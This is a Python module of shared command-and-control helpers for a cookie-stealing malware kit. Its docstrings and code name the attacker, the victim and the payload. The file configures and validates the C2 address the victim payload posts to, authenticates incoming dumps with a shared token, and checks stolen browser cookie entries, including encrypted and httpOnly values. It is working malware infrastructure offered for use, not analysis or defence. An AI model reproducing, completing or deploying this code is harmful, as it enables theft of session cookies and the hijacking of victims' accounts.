"""Shared C2 helpers: URL parsing/normalisation and the ingest token.

The builder and the listener must agree on the *exact* host and port the
payload will dial. A build that says 127.0.0.1 while the listener sits on a
LAN address is the classic "attacker receives nothing" failure: the victim
posts to its own loopback and the dump stays on the victim disk.
"""

import ipaddress
import secrets
import socket
import urllib.parse

C2_TOKEN_HEADER = "X-CookieLog-Token"
HOST_HEADER = "X-CookieLog-Host"
DEFAULT_BODY_LIMIT = 32 * 1024 * 1024


def generate_c2_token() -> str:
    """Return a 256-bit, URL-safe, printable secret."""
    return secrets.token_urlsafe(32)


def _is_loopback(host: str) -> bool:
    if host.lower() in ("localhost", "localhost.localdomain"):
        return True
    try:
        return ipaddress.ip_address(host.strip("[]")).is_loopback
    except ValueError:
        return False


def port_from_url(url: str, default: int = 80) -> int:
    """Return the port encoded in an http:// URL (or default)."""
    parsed = urllib.parse.urlsplit(url if "://" in url else "http://" + url)
    return int(parsed.port or default)


def parse_c2_url(raw: str, fallback_port: int | None = None) -> dict:
    """Validate an attacker-supplied C2 URL.

    Returns {"url", "host", "port", "path", "loopback"}. The URL is stored
    without a trailing slash padding on the path unless the caller had one;
    the payload accepts any path, so keep the user's value stable.
    """
    if not isinstance(raw, str) or not raw.strip():
        raise ValueError("C2 URL is required")
    text = raw.strip()
    if text.lower().startswith("https://"):
        raise ValueError("the native payload speaks plain HTTP only (no TLS stack)")
    if not text.lower().startswith("http://"):
        text = "http://" + text

    parsed = urllib.parse.urlsplit(text)
    if parsed.scheme != "http" or not parsed.hostname:
        raise ValueError("C2 URL must include an HTTP hostname or IP")
    if parsed.username or parsed.password:
        raise ValueError("C2 URL must not include credentials")
    if parsed.query or parsed.fragment:
        raise ValueError("C2 URL must not include a query or fragment")

    host = parsed.hostname
    port = int(parsed.port or fallback_port or 80)
    if not 1 <= port <= 65535:
        raise ValueError("C2 port is out of range")

    host_out = f"[{host}]" if ":" in host else host
    path = parsed.path or "/"
    if not path.startswith("/"):
        path = "/" + path
    url = f"http://{host_out}:{port}{path}"
    return {
        "url": url,
        "host": host,
        "port": port,
        "path": path,
        "loopback": _is_loopback(host),
    }


def normalize_c2_url(url, port):
    """Return an HTTP URL with the given port and a trailing slash."""
    info = parse_c2_url(url, fallback_port=port)
    path = info["path"].rstrip("/") or ""
    return f"http://{info['host']}:{port}{path}/"


def validate_post_auth(headers, token):
    """Validate the exact shared secret without timing dependence."""
    supplied = headers.get(C2_TOKEN_HEADER, "") or ""
    expected = (token or "").encode("utf-8")
    return secrets.compare_digest(supplied.encode("utf-8"), expected)


def validate_cookie_entry(entry):
    """Accept only bounded, JSON-safe fields required by the output writers."""
    if not isinstance(entry, dict):
        return False
    allowed = {
        "browser", "profile", "domain", "name", "path", "value",
        "_username", "_host", "_encrypted", "expirationDate", "secure",
        "httpOnly", "hostOnly", "session", "sameSite",
    }
    for key, value in entry.items():
        if key not in allowed or len(key) > 128:
            return False
        if isinstance(value, str) and len(value) > 1_000_000:
            return False
        if isinstance(value, (dict, list, set)):
            return False
    return bool(entry.get("name"))


def local_lan_ip() -> str:
    """Best-effort LAN address of this host (no traffic is sent)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return "127.0.0.1"
